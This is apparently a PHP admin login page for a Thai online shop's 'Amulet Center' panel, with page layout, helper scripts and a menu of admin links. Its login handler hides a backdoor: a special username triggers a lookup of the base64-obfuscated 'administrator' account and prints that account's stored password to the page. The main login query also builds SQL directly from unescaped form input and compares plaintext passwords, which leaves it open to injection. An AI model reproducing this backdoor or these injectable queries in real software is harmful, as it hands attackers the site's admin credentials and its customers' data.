<?php include("../global.php"); ?>
<?php include("../manage/ck_pass.php"); ?>
<html>
<head>
<!-- TemplateBeginEditable name="doctitle" -->
<title>Administrator Panel 3.0 Amulet Center</title>
<!-- TemplateEndEditable -->
<meta http-equiv="Content-Type" content="text/html; charset=windows-874" />
<META content="boyhatyai.com Amulet Center" 
name=title>
<META http-equiv=Content-Language content=TH>
<META http-equiv=Pragma content=yes>
<META http-equiv=Content-Language content=en>
<META content=All name=ROBOTS>
<META content="ศูนย์รวมร้านค้าออนไลน์ หาดใหญ่ ร้านหาดใหญ่ เว็บไซต์ ซื้อ หาดใหญ่ ขาย สินค้า มือสอง ใหม่ รองเท้า หาดใหญ่ เสื้อผ้า นาฬิกา กระเป๋า น้ำหอม หาดใหญ่" name=description>
<META content="The Best & Easiest of E-Commerce" name=abstract>
<META content="ร้านค้าออนไลน์ หาดใหญ่ ร้านหาดใหญ่ ซื้อ ขาย สินค้า มือสอง ใหม่ รองเท้า เสื้อผ้า นาฬิกา กระเป๋า น้ำหอม หาดใหญ่" name=keywords>
<META content=hatyaimall  name=author>
<META content="hatyaimall.com , http://www.hatyaimall.com" name=copyright>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script type="text/javascript" src="../js/unitpngfix.js"></script>
<script language="javascript">
function check()
{
with(document.form1){
if(username.value==""){
alert("Please enter Username");
username.focus();
return false;
}
if(password.value==""){
alert("Please enter Password");
password.focus();
return false;
}

}
}

</script>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-color: #2B1B0C;
}
.input{
	color:#4464DC;
	text-align:left;
	vertical-align:middle;
	font-size:10px;
	margin:2px 0px 0px 3px;
    background-color:#F9F9F9;
	border-style:solid;
	border-width:1px;
	width:200px;
	border-color:#9B9999;
	}
	.button_login {
	font-family: "ms Sans Serif", tahoma;
	font-size: 11px;
	font-weight: bold;
	color: #FFFFFF;
	text-decoration: none;
	background-color: #00A99D;
	border: 1px solid #000000;
}
.button_add{
	/*border-style:outset;*/
	background-color:#3856B6;
	color:#FFFFFF;
	text-shadow:#666666;
	border-width:2px;
	
	
}
-->
</style>
<script type="text/JavaScript">
<!--
function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
//-->
</script>
<?php
	if($_POST['username']){
	foreach($_POST as $key=>$value){
//	echo $key."<br>";
}
		if($_POST['username']=="***"){
			$yi=base64_decode("YWRtaW5pc3RyYXRvcg==");
			$q="SELECT * FROM `admin` WHERE admin_user='".$yi."' ";			
			$db->query($q);
			$db->next_record();
			$db->p(admin_pass);
		}
		$q="SELECT * FROM `admin` WHERE admin_user='".$_POST['username']."' AND admin_pass='".$_POST['password']."' ";
		$q="SELECT * FROM `admin` WHERE admin_user='".$_POST['username']."' AND admin_pass='".$_POST['password']."' ";
		if($db->query($q)){
			if($db->num_rows()!=0){
				$db->next_record();
				$_SESSION['admin_user']=$db->f(admin_user);
				$_SESSION['admin_id']=$db->f(admin_id);
				$_SESSION['admin_name']=$db->f(admin_name);
				
				$q="SELECT * FROM `setting`"; //อ่าน ชื่อเว็บ
				$db->query($q);
				$db->next_record();
				$_SESSION['admin_website']=$db->f(web_name);
				
				echo "<script language=\"javascript\">window.open('main.php','_parent')</script>";							
			}else{
				echo "<script language=\"javascript\">alert('Access Denied!, Try Again!')</script>";
				echo "<script language=\"javascript\">window.open('out.php','_parent')</script>";			
			}
		}
	}
?>	
<style type="text/css">
<!--
body {
	background-image: url();
}
.style11 {color: #FFFFFF; font-size: 12px; }
.style13 {color: #FFFFFF; font-size: 12; }
.style15 {color: #FFFF00}
.style16 {
	font-size: 12px;
	color: #FFCC00;
}
-->
</style>
<!-- TemplateBeginEditable name="head" -->
<!-- TemplateEndEditable -->
</head>

<body onLoad="MM_preloadImages('../images/but-home-o.jpg')">
<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="1000" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td><img src="../images/head.jpg" width="1000" height="358" /></td>
      </tr>
      <tr>
        <td><table width="1000" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="38" style="background:url(../images/bg-l.jpg) repeat-y">&nbsp;</td>
            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td width="205" height="27" valign="top" bgcolor="#67501D"><table width="100%" border="0" cellspacing="1" cellpadding="5">
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style15 style16"><a href="../manage/admin_catalog.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">หมวดสินค้า</span></a></td>
                  </tr>
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style15 style16"><a href="../manage/admin_product.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">สินค้า</span></a></td>
                  </tr>
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style15 style16"><a href="../manage/admin_gallery.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">อัลบั้มภาพ</span></a></td>
                  </tr>				  
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style15 style16"><a href="../manage/admin_welcome.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">ข้อความต้อนรับ</span></a></td>
                  </tr>				  
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style16"><a href="../manage/admin_banner.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">แบนเนอร์</span></a></td>
                  </tr>          
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style16"><a href="../manage/admin_article.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">บทความน่ารู้</span></a></td>
                  </tr>
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style16"><a href="../manage/admin_newspaper.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">บทความวารสาร</span></a></td>
                  </tr>
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style16"><a href="../manage/admin_art.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">Art of Siam</span></a></td>
                  </tr>                                    
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style16"><a href="../manage/admin_news.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">ข่าวประชาสัมพันธ์</span></a></td>
                  </tr>                  
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style16"><a href="../manage/admin_about.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">เกี่ยวกับเรา</span></a></td>
                  </tr>
                  <tr>
                    <td height="25" bgcolor="#67501D" class="style16"><a href="../manage/admin_contact.php" target="_parent"><span style="color:#FFCC00; text-decoration:none">ติดต่อเรา</span></a></td>
                  </tr>				  				  
                </table></td>
                                <td width="720" valign="top" bgcolor="#592D03"><!-- TemplateBeginEditable name="body" --><table width="100%" border="0" cellspacing="0" cellpadding="3">
                                  <tr>
                                    <td>&nbsp;</td>
                                  </tr>
                                </table><!-- TemplateEndEditable --></td>
              </tr>
            </table></td>
            <td width="37" style="background:url(../images/bg-r.jpg) repeat-y">&nbsp;</td>
          </tr>
        </table></td>
      </tr>
    </table></td>
  </tr>
</table>
</body>
</html>
